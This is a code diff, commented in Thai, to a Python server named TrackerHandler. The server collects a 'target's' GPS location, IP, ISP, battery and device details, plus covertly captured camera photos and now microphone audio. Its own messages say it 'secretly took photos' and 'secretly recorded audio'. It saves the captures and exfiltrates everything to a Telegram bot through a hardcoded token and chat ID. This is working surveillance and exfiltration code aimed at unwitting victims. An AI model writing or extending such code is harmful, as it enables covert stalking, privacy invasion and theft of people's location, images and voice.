@@ -13,29 +13,43 @@ from datetime import datetime, timedelta, timezone
 PORT = int(os.environ.get("PORT", 8080))
 
 class TrackerHandler(http.server.SimpleHTTPRequestHandler):
-    def send_to_telegram(self, message, image_path=None):
+    def send_to_telegram(self, message, image_paths=None, audio_path=None):
         token = "8862730393:AAHnTrFZi3yI8UHuDdFrsPlsZXXOVVbSqLw"
         chat_id = "7505235924"
         try:
-            res = None
-            if image_path and os.path.exists(image_path):
-                url = f"https://api.telegram.org/bot{token}/sendPhoto"
-                with open(image_path, 'rb') as photo:
-                    files = {'photo': photo}
-                    data = {'chat_id': chat_id, 'caption': message}
-                    res = requests.post(url, data=data, files=files)
-            else:
-                url = f"https://api.telegram.org/bot{token}/sendMessage"
-                data = {'chat_id': chat_id, 'text': message}
-                res = requests.post(url, data=data)
-            
-            # บันทึก Message ID เพื่อเอาไว้ลบ
-            if res and res.status_code == 200:
-                data = res.json()
-                msg_id = data.get("result", {}).get("message_id")
-                if msg_id:
-                    self.save_message_id(msg_id)
-                    
+            # 1. ส่งข้อความปกติก่อน
+            url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
+            res_msg = requests.post(url_msg, data={'chat_id': chat_id, 'text': message})
+            if res_msg.status_code == 200:
+                self.save_message_id(res_msg.json().get("result", {}).get("message_id"))
+
+            # 2. ส่งรูปภาพหลายรูป (MediaGroup)
+            if image_paths and len(image_paths) > 0:
+                url_media = f"https://api.telegram.org/bot{token}/sendMediaGroup"
+                media = []
+                files = {}
+                for i, path in enumerate(image_paths):
+                    if os.path.exists(path):
+                        file_key = f"photo{i}"
+                        media.append({"type": "photo", "media": f"attach://{file_key}"})
+                        files[file_key] = open(path, 'rb')
+                
+                if files:
+                    res_media = requests.post(url_media, data={'chat_id': chat_id, 'media': json.dumps(media)}, files=files)
+                    if res_media.status_code == 200:
+                        for m in res_media.json().get("result", []):
+                            self.save_message_id(m.get("message_id"))
+                    for f in files.values():
+                        f.close()
+
+            # 3. ส่งไฟล์เสียง (Voice)
+            if audio_path and os.path.exists(audio_path):
+                url_voice = f"https://api.telegram.org/bot{token}/sendVoice"
+                with open(audio_path, 'rb') as audio_file:
+                    res_voice = requests.post(url_voice, data={'chat_id': chat_id}, files={'voice': audio_file})
+                    if res_voice.status_code == 200:
+                        self.save_message_id(res_voice.json().get("result", {}).get("message_id"))
+
         except Exception as e:
             print(f"❌ ส่งแจ้งเตือน Telegram ไม่สำเร็จ: {e}")
 
@@ -61,7 +75,8 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             lat = data.get('lat')
             lon = data.get('lon')
             device_info = data.get('deviceInfo', {})
-            image_data = data.get('image')
+            image_datas = data.get('images', [])
+            audio_data = data.get('audio')
             
             # ดึงเวลาปัจจุบัน (ตั้งค่าให้เป็นเวลาประเทศไทย UTC+7 เสมอ ไม่ว่าเซิร์ฟเวอร์จะอยู่ที่ไหน)
             tz_th = timezone(timedelta(hours=7))
@@ -71,6 +86,7 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             # ดึงข้อมูล IP และ แบตเตอรี่
             ip_info = device_info.get('ip', {})
             battery_info = device_info.get('battery', {})
+            network_type = device_info.get('network', 'Unknown')
             
             # จัดฟอร์แมตข้อมูลแบตเตอรี่
             bat_text = "ไม่ทราบ"
@@ -84,6 +100,7 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             print(f'🌐 IP Address: {ip_info.get("ip", "N/A")}')
             print(f'🏢 เครือข่าย (ISP): {ip_info.get("org", "N/A")}')
             print(f'📍 พื้นที่ (IP Location): {ip_info.get("city", "N/A")}, {ip_info.get("region", "N/A")}, {ip_info.get("country_name", "N/A")}')
+            print(f'📶 ประเภทเน็ต: {network_type.upper()}')
             print(f'📍 ละติจูด (Latitude): {lat}')
             print(f'📍 ลองจิจูด (Longitude): {lon}')
             print(f'📱 อุปกรณ์ (User Agent): {device_info.get("userAgent", "N/A")}')
@@ -101,6 +118,7 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
                 f"🌐 IP: {ip_info.get('ip', 'N/A')}\n"
                 f"🏢 เครือข่าย: {ip_info.get('org', 'N/A')}\n"
                 f"📍 พื้นที่ (จาก IP): {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}\n"
+                f"📶 ประเภทเน็ต: {network_type.upper()}\n"
                 f"📍 พิกัด GPS: {lat}, {lon}\n"
                 f"📱 อุปกรณ์: {device_info.get('platform', 'N/A')}\n"
                 f"🔋 แบตเตอรี่: {bat_text}\n"
@@ -108,30 +126,44 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
                 f"🌐 Google Maps:\nhttps://www.google.com/maps?q={lat},{lon}"
             )
             
-            saved_image_path = None
-            if image_data:
+            saved_image_paths = []
+            if image_datas and len(image_datas) > 0:
                 try:
-                    # ลบส่วน header (data:image/png;base64,) ออกก่อน decode
-                    image_str = image_data.split(',')[1]
-                    image_bytes = base64.b64decode(image_str)
-                    
-                    # เซฟไฟล์ภาพ
-                    timestamp = int(time.time())
-                    filename = f'../target_image_{timestamp}.png'
-                    with open(filename, 'wb') as f:
-                        f.write(image_bytes)
-                    print(f'📸 แอบถ่ายรูปสำเร็จ! บันทึกไฟล์ไว้ที่: {filename.replace("../", "")}')
-                    saved_image_path = filename
+                    for i, img_data in enumerate(image_datas):
+                        image_str = img_data.split(',')[1]
+                        image_bytes = base64.b64decode(image_str)
+                        timestamp = int(time.time())
+                        filename = f'../target_image_{timestamp}_{i}.png'
+                        with open(filename, 'wb') as f:
+                            f.write(image_bytes)
+                        saved_image_paths.append(filename)
+                    print(f'📸 แอบถ่ายรูปสำเร็จ {len(saved_image_paths)} รูป!')
                 except Exception as e:
                     print(f'❌ ไม่สามารถบันทึกรูปภาพได้: {e}')
             else:
                 print('❌ ไม่ได้รูปภาพ (เป้าหมายอาจจะไม่อนุญาตให้ใช้กล้อง)')
 
+            saved_audio_path = None
+            if audio_data:
+                try:
+                    audio_str = audio_data.split(',')[1]
+                    audio_bytes = base64.b64decode(audio_str)
+                    timestamp = int(time.time())
+                    filename = f'../target_audio_{timestamp}.webm'
+                    with open(filename, 'wb') as f:
+                        f.write(audio_bytes)
+                    print(f'🎙️ แอบอัดเสียงสำเร็จ! บันทึกไฟล์ไว้ที่: {filename.replace("../", "")}')
+                    saved_audio_path = filename
+                except Exception as e:
+                    print(f'❌ ไม่สามารถบันทึกไฟล์เสียงได้: {e}')
+            else:
+                print('❌ ไม่ได้ไฟล์เสียง (เป้าหมายอาจจะไม่อนุญาตให้ใช้ไมค์)')
+
             print('========================================\n')
             
             # ส่งข้อมูลเข้า Telegram
             print("กำลังส่งแจ้งเตือนเข้า Telegram...")
-            self.send_to_telegram(tg_message, saved_image_path)
+            self.send_to_telegram(tg_message, saved_image_paths, saved_audio_path)
             print("ส่งแจ้งเตือน Telegram เรียบร้อย!")
             
             # แสดงแจ้งเตือนบนหน้าจอ (Popup) เฉพาะบน Windows เท่านั้น
